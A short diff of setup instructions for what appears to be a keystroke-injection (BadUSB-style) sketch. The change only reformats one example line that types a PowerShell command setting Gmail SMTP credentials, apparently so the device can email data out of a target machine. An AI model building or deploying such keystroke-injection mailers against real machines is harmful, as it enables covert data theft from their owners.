@@ -21,7 +21,7 @@ Here you will need to change the text that says <code>CHANGE_THIS_GMAIL_ADDRESS@
 
 Then Change the text that says <code>CHANGE_THIS_TO_GMAIL_PASSWORD</code> to the corresponding password of the email address from above.
 
-IE: <i><b>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('johndoe.techjuvi@gmail.com', 'Password1234')")</b></i>
+IE: <code>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('johndoe.techjuvi@gmail.com', 'Password1234')")</code>
 
 We will also need to specify a "from" email. Find this line of code 
 
